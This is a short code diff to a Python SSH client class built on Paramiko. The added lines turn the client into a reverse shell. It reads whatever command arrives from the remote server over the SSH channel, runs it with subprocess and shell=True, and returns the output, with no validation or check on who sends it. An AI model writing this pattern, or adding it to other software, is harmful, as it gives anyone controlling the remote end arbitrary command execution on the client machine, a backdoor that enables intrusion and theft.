@@ -6,6 +6,7 @@ import os
 import logzero
 from logzero import logger
 import threading
+import subprocess
 
 
 class sshClient(object):
@@ -102,8 +103,14 @@ class sshClient(object):
             channel = self.SSHClient.get_transport().open_session()
             logger.info("Calling invoke shell")
             logger.info("Invoke shell called")
-            channel.sendall("hello".encode())
-            logger.info("Sending message")
+
+            command = channel.recv(1024).decode()
+            receivedCommand = subprocess.check_output(command, shell=True)
+            channel.sendall(receivedCommand)
+
+            logger.info(f"Received message{command}")
+        except subprocess.CalledProcessError as e:
+            logger.error(f"Subprocess error: {e.output.decode()}")
         except paramiko.SSHException as sshErr:
             print(f'Shell invoke failed:{sshErr}')
             self.SSHClient.close()
